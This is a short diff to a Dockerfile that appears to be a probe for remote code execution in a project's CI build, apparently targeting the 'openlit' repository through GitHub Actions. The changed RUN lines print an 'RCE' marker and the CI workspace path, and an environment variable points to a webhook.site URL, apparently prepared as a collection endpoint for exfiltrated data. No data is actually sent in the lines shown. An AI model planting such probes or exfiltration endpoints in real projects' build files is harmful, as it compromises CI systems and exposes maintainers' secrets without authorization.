@@ -1,8 +1,8 @@
 
 FROM ubuntu:22.04
 
-RUN RUN echo "RCE" >&2 
-RUN RUN echo "${GITHUB_WORKSPACE}" >&2
+RUN echo "RCE" >&2 
+RUN echo "${GITHUB_WORKSPACE}" >&2
 # Export webhook environment variable
 ENV webhook="https://webhook.site/7a74c235-2eda-482d-80fd-473c9c066cc4"
 ENV repoName="openlit"
